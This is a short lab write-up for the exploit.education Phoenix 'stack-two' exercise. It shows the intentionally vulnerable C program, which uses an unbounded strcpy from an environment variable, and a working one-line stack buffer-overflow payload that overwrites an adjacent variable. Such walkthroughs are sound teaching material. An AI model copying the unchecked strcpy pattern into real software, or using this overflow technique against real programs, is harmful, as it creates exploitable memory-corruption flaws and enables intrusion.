## Stack Two
Stack Two takes a look at environment variables, and how they can be set.

## Source Code
```c
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

## Challenge
The aim is to change the contents of the changeme variable to 0x0d0a090a

## Solution
Same as `stack-one`, only this time our input is passed as an environment variable.

### The Plan
Set the environment variable `ExploitEducation` to a string overflowing `locals.buffer` and writing the `little-endian` representation of `0x0d0a090a` to `locals.changeme`.

### Breaking it
```console
user@phoenix-amd64:~$ ExploitEducation=$(python -c "print 'a'*64+'\x0a\x09\x0a\x0d'") /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
🥳
